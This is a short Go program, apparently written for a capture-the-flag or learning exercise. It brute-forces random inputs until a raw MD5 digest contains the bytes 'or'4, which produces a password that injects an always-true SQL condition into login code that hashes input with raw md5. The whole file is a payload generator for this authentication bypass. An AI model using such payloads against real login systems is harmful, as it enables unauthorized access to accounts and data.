// Inspired by https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes

package main

import (
	"math/rand"
	"fmt"
	"time"
	"strconv"
	"crypto/md5"
	"strings"
)

const THREADS = 8			// The Ryzen 3700x has 8 cores, hence this arbritary number

const STRING = "'or'4"		// 'or' followed by a number 1-9 is the shortest SQL injection code for this task
							// 4 is my lucky number so instead of checking if 'or' is tailed by 1-9...
							// we'll just check for 4 ¯\_(ツ)_/¯


func hasher(c chan int) {
	// Generate a new random seed for this specific thread
	r := rand.New(rand.NewSource(time.Now().Unix()))

	// Loop until a hash containing STRING is found
	for {
		// Generate a random string of numbers to hash
		s := strconv.Itoa(r.Int()) + strconv.Itoa(r.Int())

		// MD5 Hash the string
		hash := md5.Sum([]byte(s))

		// Check if the raw hash contains STRING
		if strings.Contains(string(hash[:]), STRING) {
			fmt.Printf("input: %s\n", s)
			fmt.Printf("hex:   %x\n", hash)
			fmt.Printf("raw:   %s\n", hash)

			break
		}
	}

	// Send a signal to the main thread that we found the right hash!
	close(c)
}


func main() {
	start := time.Now()		// If we record the time now, we can tell how much time has passed later

	sync := make(chan int, 1)	// A channel that a thread will use to tell this thread it found the right hash

	// Efficient code? NAH, just throw more cores at the problem!
	for i := 0; i < THREADS; i++ {
		time.Sleep( 1 * time.Second)
		go hasher(sync)
	}

	// Wait for a thread to close the sync channel
	<-sync

	// Indicate how much time this computation took
	elapsed := time.Since(start)
	fmt.Println("time: ", elapsed)
}
